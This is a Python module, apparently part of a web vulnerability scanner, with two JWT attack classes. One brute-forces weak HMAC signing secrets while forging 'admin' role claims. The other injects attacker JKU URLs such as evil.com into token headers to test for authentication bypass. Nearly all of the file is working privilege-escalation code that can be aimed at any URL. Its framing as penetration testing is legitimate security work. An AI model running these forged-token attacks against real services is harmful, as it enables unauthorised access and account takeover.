"""Token manipulation attacks: weak secret brute-force and JKU injection."""

import json
import logging
from pathlib import Path
from typing import Any

from .attacks import JWT_AUTH_HEADERS, create_jwt, decode_jwt_part

logger = logging.getLogger(__name__)

_WEAK_SECRETS_FILE = Path(__file__).parent / "weak_secrets.json"


def _load_weak_secrets() -> list[bytes]:
    """Load weak secret wordlist from external JSON file.

    The wordlist is loaded from a JSON file rather than hardcoded in
    source to prevent the brute-force dictionary from being shipped
    in version control and easily readable from deployed code.
    """
    try:
        raw = _WEAK_SECRETS_FILE.read_text(encoding="utf-8")
        data = json.loads(raw)
        return [s.encode("utf-8") if isinstance(s, str) else s for s in data]
    except FileNotFoundError:
        logger.warning(
            "Weak secrets file not found at %s; using minimal built-in fallback",
            _WEAK_SECRETS_FILE,
        )
        return [b"secret", b"password"]
    except (json.JSONDecodeError, TypeError) as exc:
        logger.warning("Failed to parse weak secrets file: %s", exc)
        return [b"secret", b"password"]


WEAK_SECRETS = _load_weak_secrets()


class WeakSecretAttack:
    """Tests for weak JWT signing secrets.

    Re-signs the token with common weak secrets while modifying
    claims to escalate privileges, testing if any are accepted.
    """

    def __init__(self, token: str):
        self.token = token
        self.attack_name = "weak_secret"

    def execute(self, url: str, session: Any) -> dict[str, Any]:
        """Execute the weak secret brute-force attack."""
        result: dict[str, Any] = {"attack": self.attack_name, "vulnerable": False, "details": []}
        try:
            parts = self.token.split(".")
            if len(parts) != 3:
                return result
            header = decode_jwt_part(parts[0])
            payload = decode_jwt_part(parts[1])
            if not header or not payload:
                return result

            if not isinstance(header, dict):
                header = {"alg": "HS256", "typ": "JWT"}
            alg = header.get("alg", "HS256")
            if alg not in ("HS256", "HS384", "HS512"):
                header["alg"] = "HS256"

            modified_payload = dict(payload)
            modified_payload["admin"] = True
            modified_payload["role"] = "admin"

            try:
                orig = session.get(url, timeout=8, verify=True)
                original_status = orig.status_code
            except Exception:
                original_status = 0

            for secret in WEAK_SECRETS:
                weak_token = create_jwt(header, modified_payload, secret=secret)

                for auth_header in JWT_AUTH_HEADERS:
                    resp = session.request(
                        "GET",
                        url,
                        headers={auth_header: f"Bearer {weak_token}"},
                        timeout=10,
                        verify=True,
                    )
                    status = resp.status_code
                    body = resp.text.lower()

                    if status in (200, 302) and original_status in (401, 403):
                        result["vulnerable"] = True
                        secret_preview = (
                            secret[:20].decode() if isinstance(secret, bytes) else secret[:20]
                        )
                        result["details"].append(
                            {
                                "secret_preview": secret_preview,
                                "auth_header": auth_header,
                                "status_code": status,
                                "original_status": original_status,
                                "finding": "weak_secret_accepted",
                            }
                        )
                        break

                    if status == 200 and "admin" in body:
                        result["vulnerable"] = True
                        secret_preview = (
                            secret[:20].decode() if isinstance(secret, bytes) else secret[:20]
                        )
                        result["details"].append(
                            {
                                "secret_preview": secret_preview,
                                "auth_header": auth_header,
                                "status_code": status,
                                "finding": "weak_secret_admin_reflection",
                            }
                        )
                        break

                if result["vulnerable"]:
                    break

            logger.info("Weak secret test on %s: vulnerable=%s", url, result["vulnerable"])
        except Exception as e:
            logger.error("Weak secret test error on %s: %s", url, e)
        return result


class JkuInjectionAttack:
    """Tests JKU (JWK Set URL) header injection.

    Injects attacker-controlled JKU URLs into the JWT header,
    testing if the server fetches and trusts external key sets.
    """

    def __init__(self, token: str):
        self.token = token
        self.attack_name = "jku_injection"

    def execute(self, url: str, session: Any) -> dict[str, Any]:
        """Execute the JKU injection attack."""
        result: dict[str, Any] = {"attack": self.attack_name, "vulnerable": False, "details": []}
        try:
            parts = self.token.split(".")
            if len(parts) != 3:
                return result
            header = decode_jwt_part(parts[0])
            payload = decode_jwt_part(parts[1])
            if not header or not payload:
                return result

            if not isinstance(header, dict):
                header = {"alg": "HS256", "typ": "JWT"}

            jku_urls = [
                "https://evil.com/keys.json",
                "http://attacker.com/jwks",
            ]

            try:
                orig = session.get(url, timeout=8, verify=True)
                original_status = orig.status_code
            except Exception:
                original_status = 0

            for jku_url in jku_urls:
                jku_header = dict(header)
                jku_header["jku"] = jku_url
                jku_header["alg"] = "HS256"
                jku_token = create_jwt(jku_header, payload, secret=b"secret")

                for auth_header in JWT_AUTH_HEADERS:
                    resp = session.request(
                        "GET",
                        url,
                        headers={auth_header: f"Bearer {jku_token}"},
                        timeout=10,
                        verify=True,
                    )
                    status = resp.status_code

                    if status in (200, 302) and original_status in (401, 403):
                        result["vulnerable"] = True
                        result["details"].append(
                            {
                                "jku_url": jku_url,
                                "auth_header": auth_header,
                                "status_code": status,
                                "original_status": original_status,
                                "finding": "jku_injection_auth_bypass",
                            }
                        )
                        break

                if result["vulnerable"]:
                    break

            logger.info("JKU injection test on %s: vulnerable=%s", url, result["vulnerable"])
        except Exception as e:
            logger.error("JKU injection test error on %s: %s", url, e)
        return result
